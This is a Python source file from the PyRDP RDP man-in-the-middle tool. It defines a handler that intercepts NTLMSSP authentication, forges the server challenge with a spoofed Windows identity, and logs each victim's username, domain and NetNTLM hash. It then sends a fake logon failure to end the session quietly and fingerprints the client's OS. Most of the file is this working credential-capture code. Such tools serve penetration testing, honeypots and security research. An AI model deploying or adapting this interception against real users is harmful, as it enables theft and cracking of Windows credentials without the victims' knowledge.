#
# This file is part of the PyRDP project.
# Copyright (C) 2021, 2022 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

import logging
import codecs
import secrets
from typing import Callable, Optional

from pyrdp.enum import NTLMSSPMessageType
from pyrdp.enum.ntlmssp import decodeNTLMFlags
from pyrdp.layer import SegmentationObserver, IntermediateLayer
from pyrdp.logging import LOGGER_NAMES
from pyrdp.logging.formatters import NTLMSSPHashFormatter
from pyrdp.mitm.fingerprint import resolveNTLMVersion
from pyrdp.parser import NTLMSSPParser
from pyrdp.pdu import NTLMSSPPDU, NTLMSSPChallengePDU, NTLMSSPAuthenticatePDU, NTLMSSPNegotiatePDU
from pyrdp.security import NTLMSSPState


class NLAHandler(SegmentationObserver):
    """
    Handles NLA packets by forwarding them transparently, using the onUnknownHeader event from SegmentationObserver.
    The event will be triggered when packets are sent that are neither fast-path nor TPKT (i.e: NLA).
    This also logs the hash of NLA connection attempts.
    """

    def __init__(self, sink: IntermediateLayer, state: NTLMSSPState, log: logging.LoggerAdapter,
                 ntlmCapture: bool = False, challenge: str = None,
                 disconnectCallback: Optional[Callable[[], None]] = None,
                 mitmState=None):
        """
        Create a new NLA Handler.
        sink: layer to forward packets to.
        state: NTLMSSPState that is shared between both the client-facing handler and the server-facing handler.
        disconnectCallback: called after hash capture to trigger clean connection teardown.
        mitmState: RDPMITMState for storing NTLM intelligence in fleet events.
        """

        super().__init__()
        self.sink = sink
        self.ntlmSSPState = state
        self.ntlmSSPParser = NTLMSSPParser()
        self.ntlmCapture = ntlmCapture
        self.challenge = challenge
        self.log = log
        self.disconnectCallback = disconnectCallback
        self.mitmState = mitmState

    def getChallenge(self):
        """
        Return configured challenge or a random 64-bit challenge
        """
        if self.challenge is None:
            challenge = b'%016x' % secrets.randbits(16 * 4)
        else:
            challenge = self.challenge
        return codecs.decode(challenge, 'hex')

    def onUnknownHeader(self, header, data: bytes):
        signatureOffset = self.ntlmSSPParser.findMessage(data)

        # Try to extract SPNEGO mechTypes for fingerprinting
        if signatureOffset == -1 and self.mitmState is not None:
            self._parseSPNEGOMechTypes(data)

        if signatureOffset != -1:
            message: NTLMSSPPDU = self.ntlmSSPParser.parse(data)
            self.ntlmSSPState.setMessage(message)

            if message.messageType == NTLMSSPMessageType.NEGOTIATE_MESSAGE:
                negMsg: NTLMSSPNegotiatePDU = message
                # Log Type 1 intelligence
                self.log.info("NTLM NEGOTIATE: flags=0x%(flags)08x ws=%(ws)s domain=%(domain)s", {
                    "flags": negMsg.negotiateFlags,
                    "ws": negMsg.workstation or "(empty)",
                    "domain": negMsg.domainName or "(empty)",
                })
                if self.mitmState is not None:
                    negVersion = resolveNTLMVersion(negMsg.version) if negMsg.version else ""
                    self.mitmState.ntlmNegotiateInfo = {
                        "flags": negMsg.negotiateFlags,
                        "flags_decoded": decodeNTLMFlags(negMsg.negotiateFlags),
                        "workstation": negMsg.workstation,
                        "domain": negMsg.domainName,
                    }
                    if negVersion:
                        self.mitmState.ntlmNegotiateInfo["client_os_version"] = negVersion

                if self.ntlmCapture:
                    rawChallenge = self.getChallenge()
                    challenge: NTLMSSPChallengePDU = NTLMSSPChallengePDU(rawChallenge)
                    if not self.ntlmSSPState:
                        self.ntlmSSPState = NTLMSSPState()
                    self.ntlmSSPState.setMessage(challenge)
                    self.ntlmSSPState.challenge.serverChallenge = rawChallenge
                    # Rich challenge with realistic identity
                    identity = self._getChallengeIdentity()
                    data = self.ntlmSSPParser.writeNTLMSSPChallenge(
                        identity["target"], rawChallenge,
                        nbDomain=identity["nb_domain"],
                        nbComputer=identity["nb_computer"],
                        dnsDomain=identity["dns_domain"],
                        dnsComputer=identity["dns_computer"],
                    )

            if message.messageType == NTLMSSPMessageType.AUTHENTICATE_MESSAGE:
                message: NTLMSSPAuthenticatePDU
                user = message.user
                domain = message.domain
                serverChallenge = self.ntlmSSPState.challenge.serverChallenge
                proof = message.proof
                response = message.response

                if serverChallenge is not None:
                    logging.getLogger(LOGGER_NAMES.NTLMSSP).info(user, domain, serverChallenge, proof, response)

                ntlmSSPHash = NTLMSSPHashFormatter.formatNTLMSSPHash(user, domain, serverChallenge, proof, response)
                self.log.info("[!] NTLMSSP Hash: %(ntlmSSPHash)s", {
                    "ntlmSSPHash": (ntlmSSPHash)
                })

                # Store NTLM intelligence in MITM state for fleet events
                if self.mitmState is not None:
                    ntlmVersion = resolveNTLMVersion(message.version) if message.version else ""
                    self.mitmState.ntlmInfo = {
                        "user": user,
                        "domain": domain,
                        "workstation": message.workstation,
                        "hash": ntlmSSPHash,
                        "negotiate_flags": message.negotiateFlags,
                    }
                    if ntlmVersion:
                        self.mitmState.ntlmInfo["ntlm_os_version"] = ntlmVersion
                    self.log.info("NTLM workstation=%(ws)s version=%(ver)s", {
                        "ws": message.workstation, "ver": ntlmVersion
                    })

                if self.ntlmCapture:
                    # Send a clean CredSSP error instead of letting the TLS tunnel die
                    errorResponse = self.ntlmSSPParser.writeTSRequestError(
                        version=6,
                        errorCode=0xC000006D  # STATUS_LOGON_FAILURE
                    )
                    self.sink.sendBytes(errorResponse)

                    if self.disconnectCallback:
                        self.disconnectCallback()
                    return  # Don't forward to server

        self.sink.sendBytes(data)

    def _getChallengeIdentity(self) -> dict:
        """Return NTLM challenge identity fields from config or sensible defaults."""
        config = self.mitmState.config if self.mitmState else None
        hostname = getattr(config, 'ntlmHostname', None) or "WIN-HQ7BLKRT8L4"
        domain = getattr(config, 'ntlmDomain', None) or hostname
        dnsDomain = getattr(config, 'ntlmDnsDomain', None) or f"{domain.lower()}.local"
        return {
            "target": domain,
            "nb_domain": domain,
            "nb_computer": hostname,
            "dns_domain": dnsDomain,
            "dns_computer": f"{hostname.lower()}.{dnsDomain}",
        }

    def _parseSPNEGOMechTypes(self, data: bytes):
        """Try to extract SPNEGO mechType OIDs from NegTokenInit for fingerprinting."""
        try:
            # Look for SPNEGO APPLICATION [0] tag (0x60)
            idx = data.find(b'\x06\x06\x2b\x06\x01\x05\x05\x02')  # SPNEGO OID
            if idx == -1:
                return
            mechTypes = []
            # NTLMSSP OID
            if b'\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a' in data:
                mechTypes.append("NTLMSSP")
            # MS_KRB5 OID (1.2.840.113554.1.2.2)
            if b'\x2a\x86\x48\x86\xf7\x12\x01\x02\x02' in data:
                mechTypes.append("KRB5")
            # MS_KRB5 legacy (1.2.840.48018.1.2.2)
            if b'\x2a\x86\x48\x82\xf7\x12\x01\x02\x02' in data:
                mechTypes.append("MS_KRB5")
            # NegoEx OID (1.3.6.1.4.1.311.2.2.30)
            if b'\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e' in data:
                mechTypes.append("NEGOEX")
            if mechTypes and self.mitmState is not None:
                self.mitmState.spnegoMechTypes = mechTypes
                self.log.info("SPNEGO mechTypes: %(types)s", {"types": mechTypes})
        except Exception:
            pass
